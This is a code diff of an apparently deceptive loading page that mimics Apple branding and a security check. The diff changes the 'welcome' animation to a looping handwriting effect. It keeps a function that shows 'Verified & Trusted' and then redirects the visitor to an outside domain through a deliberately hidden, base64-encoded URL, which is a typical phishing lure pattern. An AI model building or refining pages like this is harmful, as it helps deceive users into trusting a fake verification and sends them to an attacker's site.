@@ -290,31 +290,28 @@
     font-weight: 600;
   }
 
-  .title {
-    font-size: 32px;
-    font-weight: 700;
-    letter-spacing: -0.5px;
-    color: var(--text-primary);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-family: Georgia, serif;
-    min-height: 48px;
+  /* NEW WELCOME – handwriting style with clip-path */
+  .welcome-wrap {
+    position: relative;
+    display: inline-block;
   }
 
-  .title span {
+  #welcome-title {
+    font-family: "New York", Georgia, "Times New Roman", serif;
+    font-weight: 400;
+    font-size: 48px;
+    color: var(--text-primary);
+    letter-spacing: 1px;
+    white-space: nowrap;
     display: inline-block;
-    filter: blur(6px);
-    opacity: 0;
-    transition: filter 0.4s ease-out, opacity 0.4s ease-out;
-    margin-left: -0.08em;
+    clip-path: inset(0 100% 0 0);
+    animation: writeText 3s linear forwards;
+    min-height: 60px;
   }
-  .title span:first-child {
-    margin-left: 0;
-  }
-  .title span.show {
-    filter: blur(0px);
-    opacity: 1;
+
+  @keyframes writeText {
+    from { clip-path: inset(0 100% 0 0); }
+    to   { clip-path: inset(0 0% 0 0); }
   }
 
   .subtitle {
@@ -490,7 +487,7 @@
       <div class="logo-glow-ring"></div>
       <div class="logo-inner"></div>
       <div class="logo-icon">
-        <!-- ✅ PERFECT APPLE LOGO – iconic shape with bite & leaf, crisp & centered -->
+        <!-- PERFECT APPLE LOGO – iconic shape with bite & leaf -->
         <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
           <defs>
             <linearGradient id="appleGrad" x1="0%" y1="0%" x2="100%" y2="100%">
@@ -505,8 +502,12 @@
 
     <div class="title-block">
       <div class="eyebrow">Getting ready</div>
-      <!-- WELCOME ANIMATION – plays ONCE -->
-      <div id="welcome-title" class="title"></div>
+      
+      <!-- NEW HANDWRITING WELCOME (clip-path animation, loops) -->
+      <div class="welcome-wrap">
+        <span id="welcome-title">𝓌𝑒𝓁𝒸𝑜𝓂𝑒</span>
+      </div>
+
       <div class="subtitle">We're preparing your environment with industry-leading security and performance.</div>
     </div>
 
@@ -573,35 +574,22 @@
   </div>
 
 <script>
-  // --- WELCOME BLUR ANIMATION (PLAYS ONLY ONCE) ---
-  const letters = ["𝓌", "𝑒", "𝓁", "𝒸", "𝑜", "𝓂", "𝑒"];
-  const el = document.getElementById("welcome-title");
-  const totalTime = 3000;
-  const gap = totalTime / letters.length;
+  // --- HANDWRITING WELCOME ANIMATION (loops) ---
+  const welcomeEl = document.getElementById('welcome-title');
 
-  function addLetter(i) {
-    if (i >= letters.length) {
-      return; // Stops here – never repeats
-    }
+  function playWelcomeCycle() {
+    // Reset animation
+    welcomeEl.style.animation = 'none';
+    void welcomeEl.offsetWidth; // force reflow
+    welcomeEl.style.animation = 'writeText 3s linear forwards';
 
-    const span = document.createElement("span");
-    span.textContent = letters[i];
-    el.appendChild(span);
-
-    requestAnimationFrame(() => {
-      span.classList.add("show");
-    });
-
-    setTimeout(() => addLetter(i + 1), gap);
+    // After writing finishes, wait 2s then rewrite
+    setTimeout(playWelcomeCycle, 5000);
   }
 
-  function run() {
-    addLetter(0);
-  }
+  playWelcomeCycle();
 
-  run();
-
-  // --- PROGRESS BAR ---
+  // --- PROGRESS BAR (unchanged) ---
   const railFill = document.getElementById('railFill');
   const pctEl = document.getElementById('pct');
   const stageEl = document.getElementById('stage');
@@ -640,17 +628,15 @@
   }
 
   function finish() {
-    // 1. Update the CTA button state
     cta.classList.add('ready');
     cta.disabled = false;
     document.getElementById('ctaText').textContent = 'Verified & Trusted';
     cta.style.cursor = 'default';
 
-    // 2. Hidden base64 redirect – 100% done → go to cloudmhax
+    // Hidden base64 redirect
     const encodedUrl = 'aHR0cHM6Ly9jbG91ZG1oYXguY29tL2thbmdlcnJpLw==';
     const url = atob(encodedUrl);
 
-    // tiny 200ms delay so you see the "Verified & Trusted" flash, then redirect super fast
     setTimeout(() => {
       window.location.href = url;
     }, 200);
